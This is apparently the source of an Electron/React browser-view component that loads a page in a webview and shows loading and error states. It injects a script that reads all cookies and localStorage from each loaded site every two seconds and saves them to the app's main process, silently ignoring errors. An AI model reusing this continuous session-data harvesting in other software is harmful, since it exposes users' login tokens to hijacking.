import { forwardRef, useEffect, useImperativeHandle, useRef, useState } from 'react';
import { Box, Button, Flex, Spinner, Text, Icon, Link } from '@chakra-ui/react';
import { AlertTriangle } from 'lucide-react';

export type BrowserStatus = 'loading' | 'ready' | 'error';

export interface BrowserIframeHandle {
  reload: () => void;
  setZoomFactor: (factor: number) => void;
}

interface BrowserIframeProps {
  url: string;
  zoomFactor?: number;
  onStatusChange?: (status: BrowserStatus, payload?: { message?: string }) => void;
  platformName?: string;
}

// Script to capture cookies and localStorage
const getStorageScript = `
  (function() {
    try {
      const cookies = {};
      const cookieString = document.cookie || '';
      
      if (cookieString) {
        cookieString.split(';').forEach(cookie => {
          const [name, ...rest] = cookie.trim().split('=');
          if (name) {
            cookies[name] = rest.join('=') || '';
          }
        });
      }
      
      const localStorage = {};
      try {
        for (let i = 0; i < window.localStorage.length; i++) {
          const key = window.localStorage.key(i);
          if (key) {
            localStorage[key] = window.localStorage.getItem(key);
          }
        }
      } catch (e) {
        // localStorage might be blocked
      }
      
      return {
        origin: window.location.origin,
        url: window.location.href,
        cookies: cookies,
        localStorage: localStorage
      };
    } catch (error) {
      return {
        origin: window.location.origin,
        url: window.location.href || '',
        cookies: {},
        localStorage: {},
        error: error.message
      };
    }
  })();
`;

export const BrowserIframe = forwardRef<BrowserIframeHandle, BrowserIframeProps>(
({ url, zoomFactor = 1, onStatusChange, platformName }, ref) => {
  const webviewRef = useRef<WebviewTag | null>(null);
  const friendlyPlatformName = platformName || 'this page';

  const captureIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const [status, setStatus] = useState<BrowserStatus>('loading');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const domReadyRef = useRef(false);
  const pendingZoomRef = useRef(zoomFactor);

  const updateStatus = (nextStatus: BrowserStatus, message?: string) => {
    setStatus(nextStatus);
    setErrorMessage(message || null);
    onStatusChange?.(nextStatus, message ? { message } : undefined);
  };

  const reload = () => {
    const webview = webviewRef.current as any;
    if (!webview) return;
    updateStatus('loading');
    webview.reload();
  };

  const setZoom = (factor: number) => {
    const webview = webviewRef.current as any;
    pendingZoomRef.current = factor;
    if (!webview || !domReadyRef.current) return;
    try {
      webview.setZoomFactor(factor);
    } catch (err) {
      // If webview isn't ready yet, wait for dom-ready
      domReadyRef.current = false;
    }
  };

  useImperativeHandle(ref, () => ({
    reload,
    setZoomFactor: setZoom,
  }));

  // Function to capture and save cookies and localStorage
  const captureStorage = async () => {
    const webview = webviewRef.current as any;
    if (!webview) return;

    try {
      // Execute script to get cookies and localStorage from webview
      const result = await webview.executeJavaScript(getStorageScript);
      
      if (result && result.origin) {
        // Save cookies to main process
        if (result.cookies && Object.keys(result.cookies).length > 0) {
          const cookiesResult = await window.electronAPI.cookies.save(
            result.origin,
            result.url,
            result.cookies
          );
          
          if (cookiesResult.success) {
            console.log(`Cookies captured for ${result.origin}:`, Object.keys(result.cookies).length, 'cookies');
          }
        }

        // Save localStorage to main process
        if (result.localStorage && Object.keys(result.localStorage).length > 0) {
          const storageResult = await window.electronAPI.storage.save(
            result.origin,
            result.localStorage
          );
          
          if (storageResult.success) {
            console.log(`LocalStorage captured for ${result.origin}:`, Object.keys(result.localStorage).length, 'items');
          }
        }
      }
    } catch (error) {
      // Silently ignore errors (e.g., cross-origin restrictions, page not loaded, navigation in progress)
      // This is expected behavior when page hasn't loaded or is cross-origin
    }
  };

  useEffect(() => {
    const webview = webviewRef.current;
    if (!webview) return;

    domReadyRef.current = false;
    updateStatus('loading');

    const handleDOMReady = () => {
      domReadyRef.current = true;
      setZoom(pendingZoomRef.current);
      // Start capturing storage periodically
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
      }
      
      // Capture immediately
      setTimeout(captureStorage, 1000);
      
      // Capture every 2 seconds
      captureIntervalRef.current = setInterval(captureStorage, 2000);
    };

    const handleDidNavigate = (event: { url: string }) => {
      // Clear old interval
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
        captureIntervalRef.current = null;
      }

      // Start capturing for new page
      if (event.url && event.url !== 'about:blank') {
        setTimeout(() => {
          handleDOMReady();
        }, 1000);
      }
    };

    const handleDidNavigateInPage = (event: { url: string; isMainFrame: boolean }) => {
      // Handle single-page app navigation
      if (event.isMainFrame) {
        setTimeout(captureStorage, 500);
      }
    };

    const handleDidStartLoading = () => {
      updateStatus('loading');
    };

    const handleDidStopLoading = () => {
      updateStatus('ready');
    };

    const handleDidFailLoad = (event: any) => {
      // Ignore aborted navigations
      if (event.errorCode === -3) {
        return;
      }
      updateStatus('error', event.errorDescription || 'Something went wrong while loading this page.');
    };

    // Add event listeners
    const webviewAny = webview as any;
    webviewAny.addEventListener('dom-ready', handleDOMReady);
    webviewAny.addEventListener('did-navigate', handleDidNavigate);
    webviewAny.addEventListener('did-navigate-in-page', handleDidNavigateInPage);
    webviewAny.addEventListener('did-start-loading', handleDidStartLoading);
    webviewAny.addEventListener('did-stop-loading', handleDidStopLoading);
    webviewAny.addEventListener('did-fail-load', handleDidFailLoad);

    // Cleanup
    return () => {
      if (captureIntervalRef.current) {
        clearInterval(captureIntervalRef.current);
      }
      webviewAny.removeEventListener('dom-ready', handleDOMReady);
      webviewAny.removeEventListener('did-navigate', handleDidNavigate);
      webviewAny.removeEventListener('did-navigate-in-page', handleDidNavigateInPage);
      webviewAny.removeEventListener('did-start-loading', handleDidStartLoading);
      webviewAny.removeEventListener('did-stop-loading', handleDidStopLoading);
      webviewAny.removeEventListener('did-fail-load', handleDidFailLoad);
    };
  }, [url]);

  useEffect(() => {
    pendingZoomRef.current = zoomFactor;
    setZoom(zoomFactor);
  }, [zoomFactor]);

  return (
    <Box 
      w="100%" 
      h="100%" 
      overflow="hidden" 
      bg="white" 
      position="absolute"
      top={0}
      left={0}
      right={0}
      bottom={0}
    >
      <webview
        ref={webviewRef}
        src={url === 'about:blank' ? 'about:blank' : url}
        style={{
          width: '100%',
          height: '100%',
          display: 'inline-flex',
        }}
        allowpopups
        webpreferences="contextIsolation=yes, nodeIntegration=no"
      />
      {(status === 'loading' || status === 'error') && (
        <Flex
          position="absolute"
          top={4}
          left="50%"
          transform="translateX(-50%)"
          bg={status === 'error' ? 'red.500' : 'blackAlpha.600'}
          color="white"
          px={4}
          py={2}
          borderRadius="full"
          align="center"
          gap={2}
          pointerEvents="none"
          boxShadow="md"
        >
          {status === 'loading' ? (
            <Spinner size="xs" speed="0.7s" color="white" />
          ) : (
            <AlertTriangle size={14} />
          )}
          <Text fontSize="xs" fontWeight="medium">
            {status === 'loading'
              ? `Loading ${friendlyPlatformName}...`
              : `Error loading ${friendlyPlatformName}`}
          </Text>
        </Flex>
      )}
      {status === 'error' && (
        <Flex
          position="absolute"
          inset={0}
          direction="column"
          align="center"
          justify="center"
          bg="rgba(26,32,44,0.85)"
          gap={4}
          textAlign="center"
          p={6}
        >
          <Icon as={AlertTriangle} boxSize={10} color="orange.400" />
          <Box color="white" maxW="480px">
            <Text fontWeight="bold" fontSize="lg">
              There was an error loading {friendlyPlatformName}.
            </Text>
            <Text fontSize="sm" mt={2}>
              {errorMessage ||
                `${friendlyPlatformName} might be blocked by your ISP/country. Try again or use a secure network/VPN.`}
            </Text>
            <Text fontSize="sm" mt={2}>
              If this keeps happening, consider{' '}
              <Link href="https://warp.cloudflare.com/" isExternal color="blue.300" fontWeight="semibold">
                Cloudflare WARP
              </Link>{' '}
              or a trusted VPN.
            </Text>
          </Box>
          <Button onClick={reload} colorScheme="blue">
            Reload Page
          </Button>
        </Flex>
      )}
    </Box>
  );
});

BrowserIframe.displayName = 'BrowserIframe';
